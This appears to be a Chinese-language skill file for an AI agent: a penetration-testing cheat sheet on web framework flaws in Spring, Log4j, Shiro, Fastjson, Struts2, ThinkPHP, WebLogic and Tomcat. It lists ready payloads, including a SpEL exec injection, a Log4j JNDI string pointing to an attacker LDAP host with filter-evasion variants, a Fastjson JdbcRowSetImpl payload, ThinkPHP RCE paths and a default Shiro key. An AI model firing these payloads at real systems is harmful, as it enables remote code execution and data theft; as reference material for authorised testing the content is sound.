---
name: 框架漏洞补充
description: Use when encountering spring/log4j/shiro/fastjson/struts2/thinkphp/weblogic漏洞
---

# 框架漏洞补充

## Info

- **Domain**: web
- **Tags**: web, framework

## Spring系列

### Actuator端点
- `/actuator/env` 环境变量
- `/actuator/heapdump` 内存dump
- `/actuator/gateway/routes` Gateway配置

### 关键CVE
- **Spring4Shell (CVE-2022-22965)**: 参数绑定写Shell
- **Spring Cloud Gateway (CVE-2022-22947)**: SpEL RCE
- **Spring WebFlow (CVE-2017-4971)**: EL注入

### SpEL注入
`${T(java.lang.Runtime).getRuntime().exec('id')}`

---

## Log4j (CVE-2021-44228)

**基础**: `${jndi:ldap://attacker/a}`

**绕过**:
- `${${::-j}${::-n}${::-d}${::-i}:ldap://...}`
- `${${lower:j}ndi:${lower:l}dap://...}`

---

## Shiro反序列化

RememberMe Cookie + AES加密 + 反序列化

**常见密钥**: kPH+bIxk5D2deZiIxcaaaA==

**工具**: shiro_attack / ysoserial

---

## Fastjson

**JdbcRowSetImpl**:
```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://...","autoCommit":true}
```

**TemplatesImpl**: 字节码加载

---

## Struts2

**OGNL注入位置**:
- S2-045: Content-Type
- S2-046: Content-Disposition
- S2-057: URL路径

**工具**: Struts2-Scan

---

## ThinkPHP

| 版本 | Payload路径 |
|------|-------------|
| 5.x | `?s=index/think\app/invokefunction` |
| 5.0 | `?s=/index/\think\app/invokefunction` |
| 5.1 | `?s=index/\think\Request/input` |

---

## WebLogic

- **XMLDecoder**: `/wls-wsat/CoordinatorPortType`
- **T3协议**: 反序列化
- **IIOP**: 反序列化

---

## Tomcat

- **Ghostcat (CVE-2020-1938)**: AJP读取文件
- **弱口令**: /manager/html上传WAR

---

## 工具

- **ysoserial**: Java反序列化
- **JNDIExploit**: JNDI注入
- **shiro_attack**: Shiro密钥爆破